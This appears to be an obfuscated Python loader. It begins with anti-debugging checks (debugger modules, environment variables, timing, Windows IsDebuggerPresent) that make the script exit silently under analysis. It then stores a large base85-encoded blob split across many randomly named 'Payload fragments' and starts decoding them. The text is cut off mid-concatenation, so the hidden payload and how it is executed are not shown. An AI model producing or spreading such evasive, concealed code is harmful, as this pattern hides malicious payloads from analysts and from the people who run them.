#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cuJvbXwzN3IrIt = 'QQ=;_{mfYAy|H<4brdx|mckHb^%4g6h+{a+XoFG{>b}x$DKCWb><aPXAD&x$7'
_cfaz8E71xEl2QD = 'CQwD+mh+^1CrsNjUP8mw{g#eNO7ofy}mdPP-GZYEsw)orA(R|pxvHadJRac6X'
_cacxfe3IDBwQk1 = 'tcn5`_Th2FV^4S#6l}r%&yV=ibcZkM425(SRpS-EO(L#CT{&z6Z(o9Oq1{^Wu'
_cx4u5d_F_7xGay = 'S$X>*d94S76T+r?3XA}Izy!PTmaV`PQlBvFDErXd}dI*oV_c22mDSm*iis*`T'
_czzN_QWpZDpiyV = 'ov;>2}++LzQc`0!a(`qMCb-ZYTfi4CD4~6@OvejR@w3;}DsE^$4W6!pIhSMFs'
_cmDSJ7rIqymb4F = 'OiExd^$Nm4TJo`kUw!wovdTp6lDy_i#=U$e5HXAECE|s#h^Rt!HHQC08)2}`>'
_cj3AfrDjqPFOy7 = '&W>T`l33P#$M%LDa25~wSDzrDs5Tews|23Bf4XS4w#)6v{V+Q@qyIKm#i1Q{Z'
_cy6tqSY29NJWbU = '8xMHUj!en|6(!N7+-8GP(RC@yAn&J6Iu2`a+qWMlh6mH~R)>eT-xRLb8QcRhp'
_c_5e8k3JE_TITO = '?;6TDP}Hj1!e{PM|3^8%#d8SAEW&Sv)(u|_5f$#L=VgykEkyWPYVIbP^S8y~)'
_c_tDGrVy9i2IE8 = '_Dm8x?@vRDzvV?EqrA(2rs^qw1v(3pG&hs`%?5X7A<S2+w^3*DKnvaG4=T6B;'
_cfE3GNZE0FuCaj = 'o~rPkO5#@xpOtnlCnpcke5*Cr!16L9eTeRXj_i$2e7XBBvx7wO*Z2o6ut>Qkd'
_cvVJohZfPHt7Ct = '9)CS@1GcWE`Zc!@RaUY2delOzHA$0>*g)<s|$5+FDLa2WTAP}!~~~Y6V?W&1E'
_ch6Qj95q0pYhY0 = 'N0wC3#uJW$M(U5yRA<SPAKzAsOhv#<bJL|AA_G%~RnlD6Kl7LTe6btG*r6?Vz'
_cv2hk2NO4nHGMa = '0%K(<7Tf=5L!Ecd#Z0W{PJFWJ~o{{QR(MMNLTpm(inS%ckZI)6AImGc07yr~W'
_ck_k3znXsaVFf9 = 'V^pe}p!NkVS=grMfok;`yG4W}k&E{)2g7Kgy+a^_9@^zJLJqiWh*vS)&#f$bG'
_cnjPrTTkGheOip = 'Cq;xqReBlrZ1U*yRbZ^5;;M*A_v!5}leg(K1K|DQDWzxb)J%MBOxdM4a+wMfv'
_cwwl31iCez7J7v = 'jtCVSD^^$!S>bG4YZteJ4)meO)b8+YRht{&e8v+XdHlBr`B%)DjQy$7H3;!YT'
_cffOGZIP59OT5p = 'vFtB3t7vQaEq8ma20b^tf`2wQT9>%Up?M*rcJ^qpjaj^*pu_XmiXD86Z>_POG'
_cgq7FUqvkkYn2w = ';5KssRaW<s{w)LQRiCgB*sd4k<(lVpUpDaC8SA1l)XWgW+WQD4!6{OrKxLzK@'
_cq2R6v9ILUIxke = 't2?$gRr08O@O>Zt~%2M=L&X62zF<_8}nR3%S$0!{eByE!BB2ZtlKsy(p9ySUy'
_cwrX36TJXQRe6b = 'Na$nb63D)K#H*FZDZO$_uIt#xUMftgeX&74{yd+J0(xf%(aihP*Js|pW*7d@k'
_cmBqV93e7nb3Ky = 'W_3g3xO@h#RL|bIkUi{6&@i|6cDXO0~yK#<jZz0#&W?4gM=<fshneX#A~@Tea'
_ct0wvRHb4ToNGS = 'hV7IaeBeVSZ8NosO@R4Pxs_1ls<$O6iU*6UeA3LV_0(`YR{+w!kdK>Xh=2j&;'
_cgAGvVcIoXxM4s = 'cMYxEO)Ea`O5HykBih;}EYfe?}AkkxCn1qoD0pTdTW#1rEK0AoetcSc1XcSmz'
_cb4CueU_U84B7S = 'Ce`2F5TD$Qv*!eA-P1;<!WC-%%N&_7SbBx@rXGDn<mzi8b@OwMBPNoBzSp}$Y'
_czyZFbW3deLgfg = '>>DXab*6BlvV_<H@g31<e2+1XnGh;?YGX`mS{_B1th)<WXB52%z&_%h?Ud)Pi'
_cra2h8SGiBKDCv = '7RRjZ>(<Lj>czB%q0zbk$$XzgYxx(E-*GQQB(<qYL;gD1JhVMP;}&^<FW&u97'
_clqNPWODY4LsPv = 'Bv%F75wfIOoCka%fIh@NwYY1GL@TS(LinaS%_>qyyK+l2*+DIFQ9cy`moIO^8'
_cwyKcdfHJQbyY5 = 'A7lJNBP8wINX@#J$wj7Q*uT$TeT2>hdz*D<%?zTx(%4e1<`)8k~@BORy*6bs}'
_ceYOdWs3onE11N = '*cKn^@3<%w%@X(vB-f8Kld*q^)ZE|{bnaokrkSv~ID-U$tr7bMa?3=%-^l`iZ'
_cw73csXPVNqkSd = 'bkx45mOhP9$N439efm{9oaabrbDtHOx9bihj8jW~lSaghk~DdI1K`?1;}x+8{'
_cwK5XfUKs_I2XO = 'ZoPaId{)$W{cJL3A;zf0OQ&TjRrmds)GtEkWN0GTy~oRvw)gif%=HRv&{v&l~'
_ceqO8oTJLz1Xtx = 'fZA*XROT>6HAh?0!5*oVcMr0<?`5UZBIN%bBQc*9p#cMnHzxvJT;6@7)IcM}R'
_ca7zEqQAy7l3nj = '?+#YTdm$V84cU1!|C%!kD)o(Q&3Kd81}@TEnUDGPqJMo)sV9((>gq%JzHo+F!'
_cwErqplaJRQBo8 = 'DGGu#xr6H8^#-P%P>I5}+SH=ud9@e+&6-fE$-wuBW0iSs$K|%YqBXUxdjed(1'
_ceGuUNTeIFEh8S = '^$^+E(!4>G{BqfC-KC_j_?`CIz-zQmao>KEQ8oFONtNU94O7x2GwEjkC0~hw4'
_cvnD538qk0wWLK = '3VQ|$o*LJ+nz<9aK+)$B}amh-K5inE}-KZHSI*G@}v60YXtu^9VYSvmFr-NJB'
_ckcsF4caIzcGwV = 'gZfy@JmM@HWE=SVrO^Gt#ip^6b!dYjR;e&WINcB2W!>aPWV%fYvI-;(2EM{#?'
_cjofSOIeNliLbq = 'i7zNJgww7zb*-`8<5l_{W2sme~YV_G@HmS#*3e{bNvt^s>9|GJqSq{d)Aq5qH'
_co91jiOKd7s30f = 'jU-<5G*(6^I{PAJVfc(Fp@3{WCRo>ew68EccAqZC#ddfIMR9bkVnx8TBqa#8g'
_cf1b83YCztUALw = 'vKyLt-2Q*CD%j9Mey7-C16Gzpvt|sBJN`Re>%VbxaWSm1w^2+8FBGs_VyiiCf'
_czU79u7MPHzHro = '8{hV>}iYMv5U6G3X+qRadrzpSrqZQHs=r`><6Z)GR;}M04GihJ-0($cn?U8FG'
_cvPZ9Iyiv_vXa8 = 'sCEX!kRzH-WLku0w$rDXbIh<9WfglD#rg1}W&wKd&_<Vw@ECmctjoABS95<TT'
_cbrJGD3K14ny93 = '3apuTCB3cJI&Jr_3&__DNs{23<<rkf<=B>aUb@Be%flin%{$4DEPRy5S7nUgT'
_ccWj8guT6cy1hs = 'PBEM@#7t`xH{8A0OGInTx5RnEm9e|M*HCCb#KVD~YE1fw>Ly5g>Dah^VWgsF#'
_ceULSHk7F5o4uZ = '?9A0zj)~S>gryrDMY+Mp<H0kPhstPLC5RX%O7m=nTX=KVjnjB6if9Y^+27^WY'
_cuwehASynSFShj = 'Jdl+;+JOlYc)kzV+h}U@33G{wP@7r{K74iLgXXlAOo|H)>>?!dlej%?gE&IFe'
_cx8_eq3qJ7AQee = '0jitEE1yu#d|3??@nNvMHmQD)g`>02S?Azu!0~Lura`o()c?^-+jD4a`NxwaM'
_cswmS_HmDM2vWT = 'x(S9sM&ewSGau9^ih+_}{KL8VTq(GaL6^^YptwQ~9q6t|yk6qf~Do6b$-zF(('
_cifQufZVfOhdYK = '41~1m~MGG{5JD#}4FCcuMY;bpD3xZ%9(Dsb5tOmf^s_OUa^4`NRYvVMU;8^)}'
_cmA9P3a0x7wXVI = 'HaZMBz{5~!isCp-S}Qu3)==*>-)Dcrk-piR@yN*#*ZS9idWVK%E5`kw;^MFxH'
_cezJGXRdUOVqBJ = 'mq%F<Xa5ZP6os=f*%8jd_v16vyER}E*j(?%!ivi0mF~lRaeo6B)}4fc7W=Ud9'
_ceiC0_778Q8Xyw = '!bx3(HQ<woK{9G%hiIxPsdRbT4XqMD^auV|+TcL;Ive0ciSyCIC7b^&r>9K+3'
_cvhl7LxdDJtGK2 = 'ttX-p?@^E6=K?3M~|&$lb$I_%~-`!wqFktd+0Xej}cQ;e!LM9jLpl}IN@3C$T'
_cfDjq5jvDFmMgN = 'e7^j?FI0_J@0pC*D)(kjmH4D>O1SF<OgDO8F;cIX)a6$<sf0v??F{`gxCQ_&l'
_cb67Jgu0dZ8M1a = '<i2$&$XBGrX(w`a&?qN$mnqzbY~|f|%eu39kxnOZF!oRY_{OIyY`xw8uv{uE$'
_cnC1Dc4bLYFgzf = 'jeY?Y;)-cusH?|VNQLwGZej|O-;KjVp?`2AlB>YFL~)`PkPU=Db(a`0O5rL>9'
_cxcnix4igTShaK = 'oS_>i3Os$(^w4G@_<=$pH0*AMo&OZ#G`BD@tIfB%|{3U6vbOsY|$s%eEpQ0no'
_ci7nNSewYtOvim = 'y7bj+uCK!2ish~r4$3vv6IQysOV*;KyN%bF_5^(f?3ML#IHVY!#4vX$XQA^#`'
_cv1eQUtbQUT8n8 = 'KN#`OjJO@Pas*43=<Wk9f%@`d5RsoAlb%TwV5L_U~Y5&ngEI4ITpsggtzu*g_'
_czOJjp3qP1Mc6A = 'Ur%dA$A%#lBje|9p_goe#EJp@1YB34kH34ult{3o_Unk1Mpb}jWINsE5TrP1p'
_ciEOAapTXKAz9F = '|3TS3*omHDEn#w7KoFLfY}Y_Bg9qUoEyo^(eIo~S^}^;8omXV+b6(IrFSBI%_'
_cowRayrIjBdTIx = '8cExp9@(Dj|*=45;Tx=9FADLdQ-?7$6}N9&ou6VbTe4ad&O~gT_g1B4jsJJfk'
_cz1j0nA4cF0Ldd = 'h@?Cy^xWBh8Z^=@zbVkZ9lcI7sj^z1PkHfVOSSBfg&nA2)D3g0atn;@MXc(j~'
_cpXPYqCGwkku5l = 'xpAQ$XVs}Q}Acy=wkIR5)cK<eJL6)w}$EEN(LY1ew!PpQ5#-j{|{jJHXa)6-J'
_ct8KZsTyKXvYIo = 'z$eH8NpRQ1mHU+>g(Vq^1EKeE75|~wr+g=)$h42*JnVL%bcshm|LirAraA)7$'
_c_J3ggMj9uc0vV = 'mK62p!CO-iVP>!LQGlv<ev|G2XYRPDl(~0558@Gn(mbLi13ms6qdzwCcfPs4<'
_csEhiK4YzG5Nzc = '3b0EFJcfU+9^QJH0)u+@??@8DHQuHb%n#wJIp8Ow34SK`=1p<4hU8z8oYR^Z3'
_cmONjqW3pN3xKL = ';fsf1|5i>kK-Vf41z+6?s*cp@(1>^?$Wi@Jm=$6G?AB<Of(a%i~coG*?5O`*U'
_clcfozy7dAnfSA = 'N0K$!<!+LzU7Bl$794g%l@b^37a+eJZxtI0i!jF4yF;lJ(rF^WEM%|LfmAOSy'
_csnabkpEb8DP_0 = 'MpX4apmSb+{ta`tB%6hW?hh!M#~5|ARG1-%KJWyyjh&QedhfyEj%NEXtE>X5B'
_cjD4h8ltJtn_nf = 'S1EgOjsLoyK)yN#Z~An0rk(QQjV}w+vEp27^Hllb5Bi96J0Hx9;jqI;IZe%Xe'
_csF_AmbRHCGuuJ = 'uMuv8hkflzWylxR%yR1u|FRt9`=wwiO5s276thH3;3P&avSQX><6}AMa@qF9X'
_cuFCbqHR72t1Pk = '<xHjYl9`PLASqf))m(}mw=W&L<p%CKq1=vE57&w~B%OSKK>{_gUOlvAG)ScHk'
_cl5wvzzH971RMw = 'G@@|&t()v<~3@fj|g%h*yP{x0E^lX`m&uy_bLH7RQs>u=LUL0$1)!8duWbxrD'
_cnJ1MpGbPzdwhG = 'dl&vdz|wGFr4I9MS%ZKo?VWgt`*U97Hud;sA%~U)<MRKyxvff#qEjCrAJY!zs'
_ci1mCmr8lovijk = 'K^s}s67LcwO!?n7%5}qB$1Y!n^58QB>Rfqt;tn?^I-f8C~6^S+mTpsSTub|rm'
_ci6ykhh_HfV6l0 = '<?jE5%@xcW%1Au4#H+<$B@rbZehYb_DxAG`^n`vF;&U8UWC?ySg#76!q@hNo-'
_crpqq6gyLWuCUy = 'h<Pjam=%hBMN!_gMnccO*x<xh0ID~EXIKN0>yt~H2Rf>|ol-R%dFhcGNe+o63'
_cpiHu64iYr19LX = 'gM`_J`4$#AK%oBho3qh%fPi<9|v=7Rg!|VPLfvl8!Oz%-L<GosJ9L);ro*<Z^'
_ceJSm0gxyJE2Hf = '`ECe>02h<$W7ieA56-rkw*Ngh(ByX|s8tFrS9>Z27!#KC-7{?y`x;`QfGr9L0'
_ctcfNXA73fMjf8 = 'ISpA8W30b4oVxOHOZ%;x6?S*^@51brto=@3v-LGm=|fQIFUiZz75AswRd7wZm'
_ctI53GkuOV0386 = 'Vq1uz!OlqGIBY!O!*FNz<Fa28amK8f>5UrzLT3RdkY%ZDgh)6A_9%q)5CL&6n'
_cjqfLXRWkV09i2 = 'G(j@s+gkl+q?%zwQt6DHDh5r$@Iy(UwN)`gaGcIixaP1XCgai7$y-R6y7;;>o'
_cd5TWckk5unXgr = 'TkB`)Wg*O920?WNn3S=+hyApUt^vLR+(Wp%uGfGd-4cokt_HmPiyl=3Q{eKE*'
_ce9lR1SLYdtqSn = 'btbH`kEs_XwEk|~=KN8bh^FG5iU8%JeaoP*6PMq!*E5j&-+K?0Pwffi|8vd3w'
_c_MsykY_YB_leR = 'ZReQ${0*6GH<k4^~h<Fjp&#SfCi{YS#jkoD9SY4s#&>bgWZ86SH`c5kH+`;HS'
_clKEb1j33jxQcQ = '<$|)R?sA9V8b^{<Z5Ql(Vcz^aprR!ivYl1C1fnx%8KON!h+iCdbGH;ER|;{=o'
_cdQAC8DaDy4O7h = ')Q^zk_j*UvPpcCIb4J><_tVeqZk_SSWpxF}MG=>|h=A@t`kf9*XjY)+>zWOR!'
_coZqKGnv8qgjhf = '|?oofcu)~WCxnEh1!&odI#e`bgI~aws1-43!JH@~p1}3#f3GwNW4A#wPS#Xst'
_cfiv01hL7xsKXb = 'F>DbrzG2xemi@jPE)j4^OR^AzQ_mA{TFt5FV`b&i#cOv#2z&>R21dGjE|F#eZ'
_cdeYl3nYn4xmoC = '6^)-avCDw+9_kjQ05)t@GUGnucdjKwVj6*vS7g=Gq)b!ftHw=vdYRRS`1}6?M'
_ciQb0nTg6z5cTc = 'Q!=3JiV|RPvO%S9{k_>hTvcq4g#N3NietSKU;HC@4>*BDTIt%A3QoPb_<&Qo)'
_ciDZnjzm6NHcs0 = '{QWZ0Ys|2hs{XJ~ISuKiB-KV{d81y&vyke7g<DitNUQ${-WQzTg<fMzH`wuvS'
_ccDfpV37CDjyCP = 'W*Ul4cl0#2`=2=6z|I$BBn|n3?G>11^%jmyH=fb)vBQbk5Xdh}jpR|1x?U91C'
_cc3LhlRt44x7Mt = '7y0qmKmrV&f<1O>vdS@4{^~GA>uwx(<e?a_b*D!7P1}H@a-Ltm;F>GPY1()#-'
_ciFbZL_FihqzOb = 'gm8Vuqr$SHDVxjF&LVS;}LX~;;!$Bs7krp^mc0Xp5Em0wGl-m-#JHuZ>Bz`Of'
_cxf9tBDLip6vxe = '36kbS;g+ZZAK(d~-+~)7iLVRP@j4MBNaH;9>ER(gR|>=CW?$nS%P$HyYCuh^q'
_cw83MPoblaoRBR = '=w&xw!NM%R{bm=dA8#e|lK99|bEgJi$)N!RushS#ldopvlRKOzO2jf%@9O~3A'
_cok6cflQZFIkbY = 'KmyVz(|Md<8tsZ*x-KkU}Ga6N{zF(&ug3i*d8m7bvyz_;@GxbG>shu1-)V{Q1'
_cxpDtAquvPDiNM = 't=|;5Y>32XmrQA9N1>u`0U(x?s27b^VXfO0UvFZJM~rTS3@B}_gx!~CWPp=@('
_cimaJ4QOqcEJEo = 'BrMjE^daWi4Ytwt~&nol}I>qACl}2YAD^jJ&70rc*mvmCQ8^y?BkttVRFR8k('
_cvs0KQ1uRL2EHF = 'buk6TUw!Y;X~0x;AGsTAzK;R1!PpJcb)Rf};-0%7m9*a8qS1xRN+YoZXRRD|N'
_clsr9gWXmbQY4z = 'fhk`1|afJqm&BP8^I*Gf3{)jrJ~O5*t7BGE8s#uH%lH7rzyA65vf^qu~r0xnS'
_cc80x4l3EF0SDR = 'v{9wy~5-xV6-GZDm!4K=tD^J!;gEUJpvOB-?4nnM_g?ScJ6Y+*o<|&ubpJauy'
_ce_EUZn04TpTAe = 'z>F@xIiJ$*!Lj0BNB9kQ{pS(fy(F)jy<lRBqajzJMkyabB#Dha&!~H1lb|{!h'
_cucaAs3icLyM2m = 'cAf!36$q%<U^H=K%S?2c4-sa0}#E~;uU!oVks%Unhrimn|yYnuA%M;=5Z^X-)'
_ceJdOZ_10rgvko = 'snCybMCwSoLVihB7S=Kj2Xl=qP{1E5?m>`>zyLgl2Y{$jlUgou0O7snw}nPIa'
_cq8t23A9jJeMdQ = 'VXE$q`XY*E7^bTS;ONGkrN381OK9y!bG$L2CbtcXq;LyA`MP=W8OroC&<3Lm#'
_ccwUsnR1HLcCyF = ';?!AG`?8Lx;x+E2fMMwlIxZwG8mWWwK!5G;!8xD4|)h{BYgH25@dFh;-_^v34'
_caIZ_92YPLvr1Y = 'x*y*`{>Ne56yAUXnI5r`+JVJ|ZnrY}bBz2qW0tu~nPf~3NiA&5qT#=1xwwl(Q'
_coKj52kIBN3RLc = 'P@kO9iDi#m49>@Bnq-*C1TPO?o8f5!laRdN*e4FkTv3D7*Dzw5e~Vz6_vYhAJ'
_clUC6f3KdPld0b = 'uc!^_~MZ@<Ekp_#i4aHFGu%1svYT!eL%6_$=P6ZJfx+z^ahG+-Y?S6gQyMZcb'
_cejMoFdz0WpbDb = '?_R|pMi=V;69p>j<s6?#&Kj>5HXG^ZDwFhW+|ZOx~ysPz8^g)iuUS=+*!bs%a'
_cuq5FoHWm8t8uS = 'Tn@e`Z%4<D|1zpXL*4wxMB*;-u+5z1ecN2)?%?-(27ROgD)uB<pr<O+6XHkxR'
_cg3rxB3C57XFTi = ')^D=JjC&s94(n9?zHjok8}BlCfLGgSS7Zpg2(jtbZIWc2@|=G#LqX2544_*%o'
_cawK7rAsPgeTf3 = 'QG)Q+3@)yiU)YDH1==&o>m1{6gG6eb>4wit)c7Vtx%kSIiMbs<;3@qS!#m*W%'
_ceh8KIQ8JpbFGX = 'x?qdqjeXlCCTj6BDo`+WHKyXO;7Em_#g}OF&Vf^!yjNTfh83*=P1;g?cKEQuz'
_cwlwWkBQifsEUx = '=~-xuf_T}RL}xrc=Ll8#1OnP|j}BrK*;W?fc9E&uK;#=EG_#>NZ95E&}`keWO'
_ckfqkX3CWajTKA = '>q;v|X9CJ}a^ilH+9U%bcAeV#LLp|Uq!fCV89_i$RU(h?#y+*(ra4q+MJZr)='
_clK7xZE_24fT8Q = '^r3(56etw_6MUh-63Khn+cmv8155$Hj%=uPoU<^v2oO0{q$k>6Aw4EllZD7#^'
_co7WePaiQo7fY1 = '<6cK3aFq0biP^U*wR;s%y_o^{cT4w&lFMbhFl`g{bT8&Lr$(efuxleQ-3CFK`'
_cjcEuYUZW5OCnZ = 'q{yyk(ewVT<{t`X$jOpLKNcqgQOOQfywDN^VR}HS-c1_Ff(esN1(JtJnv+6r{'
_chMUvnqfekp5rA = '^2CT^DV*!VdU75NIn#UHjzo>$m?<1T6Y#r;*%ZKDH)PB}<r?<zL`Fm&`Q_GT2'
_cgGIcVjr4QCCsh = 'c)L>U0_5;2^6}R3W_B)zkl68u49!a67v0d5LFW8ACn{;U_=ku|@H95+MPzfsW'
_cqIkvfhLAI2UKW = 'iRLwF@4(cr!>yaR^GS(pCZC)NF{zh#=Yg6t1x&ahdLFp30cf0efhddD&F6iJv'
_coNM0MC_1pEPdr = '(m`kENYxDy@M2wZ7_@&%lC`f?-FS8H)+G_Z#o4j!O520!s#DXvK0d5*a#n%Gw'
_c_5KdQGaQNYhqR = 'NKP(rB$g5$#BB$|ltuT?<_Uet{tV7G1s;<ABshS7@dSqp|NU%-dw4L*EQH@#c'
_crFI4G9r8PHyN0 = 'tg77Dt(_Y|p4vNsGDhQq&iBlLLlrP=V!NfizCKY$aXAZp>zWJ@WRt6353qOTO'
_ckoxP5udRBiaAB = '>TA`WPdd6oj_G5u2fo%=n*`cHo^RE>O&{fSGVPft2blQuKrw^uveeZ$(b(p`4'
_cp8ppuXf9pBAaq = 'gh_P>O0m&@EQqXySYR>u{9%%Fac->~PUu)+-gISpY%}_h)q@Rhn`+Y8YD>2Nd'
_cmh44Xm7eXUfbT = 'G;qcb1X*xri`h04bYv}gsGma%#nkkiNLoI`O%aeZX9aX$<jk??z2P|f#D6*b_'
_cqXY6ezMY1IMZY = 'uJ*AS>#k;GyX%)Ue{2ugh`Z>7t=y->cG(P^b=2o0F5X>y2SP!I2E1F#|9_RN*'
_cfheEyj3JGVC0o = 'KA_=o<Kt&+`<9a2V^>_L(C5|&ct;lo@}p6K8P9>9GRt8~{ZQ0!kAR0lvg?MbW'
_cbxxLZ7wBOwlES = 'Z;t~2rj*$B>a)NYczNE8r&NfDq{K=anwbZZkPP2}?WL>aL@jybRY9~?d&X-E%'
_coUmRw9c1q_C3B = '*NX$2#zH|`z-jaG<C5$lHh+Me`%8#f_MZw@-s?F0byC8bTVpzzrn;IDOhEI@M'
_cwRmqBOqbFZqTO = 's&RP&7c5N`W};otX7(S0_<409!RRnMu5?AF?V_av?6xD77464%X6D+Fy`^q8u'
_chk2gImDYdAiX7 = 'pX##o!wIF_?s|wI9%bNfbOI8(79LKMnQh{Dqxvu-d?_x<yG1q?uKx<%2W;(@Q'
_cqIMnuqFPt7lVV = '1v!RR9&T~9SYK8#7@#W4^gCS*AAPSz2ft<gdT>1Ux90>>{XxPwdx!PA0fWNvk'
_csbzMMazB2Z06_ = 't$%hAn>ohEuXRy$gnT$c)@$MjfguZ2A3)MeD!9nXvVY!19Z9cT84?~sJ(Obzp'
_cybxqcrfJg82yz = 'J?MH`L)ar%S=%Fx4f;|cksFRkdk$F7dZ-=+uOxEDaLOv)U=P14Q1%SD{goly('
_czQlWUqaYj4Q8P = 'rORl|9<6rJfhmP(X_n$XEqXCh+d;*hShKKfY6WU$vhq0fp`Q>mkabNzj5R*)S'
_czQDDaHcTO9X6P = '9WTHTx5)DnyCFMc-fE$!mDx!93dh>xUrB_ugB^TQ3cclHAbHyiu?BE<x)3q{Q'
_cruIeQE4ohTuKe = 'wavjCi0rcVMb(np{_ZY1iOwsEs%BM{P<*>j`w1RpooO0cj-FQ*u+P??X13Wbw'
_cjLiCBVzlRtaqM = '<he<jIgpt4*-s5vozabL$aD6gYszB}P(e69$Db^IA-Z>HAAyjl31K8cW{ge#E'
_chqrs1xX0SPF3x = 'rpKif_eP@@(<T!-cyAW-ncGCna%4Aa8B6)r=)hV)61v0?n_vCYSKsmvNv<maM'
_cyadmXsZq7j6yo = '|;w7a#gUFz+Kh|a(c^^ZsT7pGGQcuUJq^wdqR)hdf8jpwrcxwMcU)Y>-oh3a%'
_cob1DhRdUpSJKV = '4*5Y6k9x9pgPLLH||XFY9*j_Cx*!I$MP+?qAMpjPA73;Sy^TE}eXDz5(bJb0%'
_cjME0gBopWLLgu = '*BZ)dD`nTm^<7arF7slS>(44yg{(|$_&g#faKO5<wYr=~^sFcQm7lN0`DcrG-'
_cuSptNUMXrY6EL = 'QMATCV9E+dMC@gwJAhy_gP(e;>O&Fu*lI2stBOWLRE<9Xg8?U_b@Loxh*Q$1i'
_cnHWJCtXc7Sols = 'dHi;~1~)uoVA8aEwY~9AbOKTa12NTN!7iV{?7>rRUf!xzQ~(E?TGNs|n{J`zG'
_cqkKnwgljeAqBJ = '~6dhlbOR(({N);j3;nzu@H~M7HHdg#zuYUE3rC>%fSvhPz2J=%8-ch+!kj3ax'
_cvLgdZUVzRGjuR = 'bq|ERBB$d49t*$*Q{xrvli4sVNm3)hxJ2GuPhY+%KnHRCl)9ZE|Veg;z{I3C?'
_ccvcPiNMUoRI5R = 'lJx-_Z-l!8IMDA}zY^NmjZ7a%+q+64TYR0&(s0zVX*RV@S7qaij_eu+i?#hNp'
_ccQDANIZEi1GlP = 'u4K!zr`ciXmh04SLFBe7O(imJT_SQmz0Ng}naVGSr2^eO}Js1~DfILe71qT8U'
_cpNNN2FuwlIkWU = 'sw)9=-|ZNafw8rzVH$G55YIyuo%SnVha`y3ILr2DBvAtUTZ4o?idxG`I0gzN('
_cvws35kg1naeyf = 'jqIqd#PZqVzJ0JXLhp_$Tw|FpJZ8332LFKA|V*=L90KK%`|^Y()-q9E23*+kO'
_co2FS9CCZYVk1e = 'mX8u7INSb1kay-cAQR73og@*5PV`UTvB`+^9Ek)Mm(3V2*TILv@94k1{nBbSd'
_cjwJPZGDTUHlXs = 'oeHT`*Z0sWh33g+3cN`(?n>sh!0tv?Wv!S=+1_6=#ZzpFTbE-Wb-Hm{&=B8F*'
_cdUCba1HbawZSt = 'I-`l`^CTpk%zoZd)IeEG-j%t}9r+_Tvs(ytsmWMwAe}<)>#nEd68IvzK9MEm?'
_ct6PaOBzweKyXH = 'Q{sj*LU!6Fy}hLT)VEBiGx-sJbaO!|$^e}9k_n;%Uo;@eOIsvlmg(C$7zfs6='
_cqD386oV6UG0c3 = 'lcFvkhEkCs(5H`Tcce7vhvWkH5pBM%dl7KrT$#-S2sYo#&qth=;&t;a0i*d=g'
_cqPIe_AJA3Za7R = 'vggLn}GK^)hMQb0G9ai0hML4n(3qi?U;tpW3xTnFWa6Y%YY}x%DKENruw1-Tb'
_cy6OVTumY30I3s = 'vA<@Be+t10!Y#mwhG>D;s$S4=Wjudth!hY4)$(&+3^c?>yd`IG^l<qNE2!6ed'
_ciRgfKew2ZOhmi = 'n24t62$e-%#T2ZQRM8eTJ$+1+*2!#Wo_@`JAM~wCuGuf-971Jo*8NKqJh#pDb'
_cxea6gkEX1amLD = 'hEy4ON`(W^f#`SIP?!aNZ=Y%v^(A1sJkxRt$uD@mUkU_?Ae9W-S_Uriy;?AC+'
_cytWwzMrcgnRVV = 'BN2Mz@>{38BSH-tkg<ay6;#g3&s<U4TQ74UDYcKdgQGAJv#jaC7Dn&*}=#Pd?'
_cgdiUtLdLS3pMO = '^Te@1ytD{e{vM&iH62MiMFH2T}y@$EGv3fVe8B!)rqe+jxTs1N8P7e?QZ?{6)'
_cpsZJOOsNvgfBR = 'EjLoYuZQ6s$Sag8}$Nu1w6^ur`ELr|(W?W|#M25;!DzFnoR*}e7~o6o1)BC(Q'
_cvZbyFiYEfDmbz = '3p3t_Gc@Z@B77DmO%8z<5vOqB`j#L+U0ZO1j;yi*mpaV<gkw4AYL4a0ALx2AS'
_cnS1n7KZarvjAM = '9ya%bV>kkHqhTG*XrpNAz+%=WwGbDoxERb3@EO>aY3Tbm%Z1xoZmLlRhlX&V!'
_crH4hEPhYxjPu7 = '-47FM6tvZrOH@%PdB87hbA$<w>yJnwjnW|Mjim~{VB@*AKGR-z~qrRsfE!3)R'
_co6cw6NIJZ8k7e = 'eQ?<$_%1Co2o-23=%3f1x7Dbt37~s~0hiziZWm!qgf$(-88gjT&rSFfRl=!J~'
_cpfhkQUpzUk2lN = '@>5lOO)f&'

_px8GtjbkB8qtc8 = __import__('base64').b85decode(_cuJvbXwzN3IrIt + _cfaz8E71xEl2QD + _cacxfe3IDBwQk1 + _cx4u5d_F_7xGay + _czzN_QWpZDpiyV + _cmDSJ7rIqymb4F + _cj3AfrDjqPFOy7 + _cy6tqSY29NJWbU + _c_5e8k3JE_TITO + _c_tDGrVy9i2IE8 + _cfE3GNZE0FuCaj + _cvVJohZfPHt7Ct + _ch6Qj95q0pYhY0 + _cv2hk2NO4nHGMa + _ck_k3znXsaVFf9 + _cnjPrTTkGheOip + _cwwl31iCez7J7v + _cffOGZIP59OT5p + _cgq7FUqvkkYn2w + _cq2R6v9ILUIxke + _cwrX36TJXQRe6b + _cmBqV93e7nb3Ky + _ct0wvRHb4ToNGS + _cgAGvVcIoXxM4s + _cb4CueU_U84B7S + _czyZFbW3deLgfg + _cra2h8SGiBKDCv + _clqNPWODY4LsPv + _cwyKcdfHJQbyY5 + _ceYOdWs3onE11N + _cw73csXPVNqkSd + _cwK5XfUKs_I2XO + _ceqO8oTJLz1Xtx + _ca7zEqQAy7l3nj + _cwErqplaJRQBo8 + _ceGuUNTeIFEh8S + _cvnD538qk0wWLK + _ckcsF4caIzcGwV + _cjofSOIeNliLbq + _co91jiOKd7s30f + _cf1b83YCztUALw + 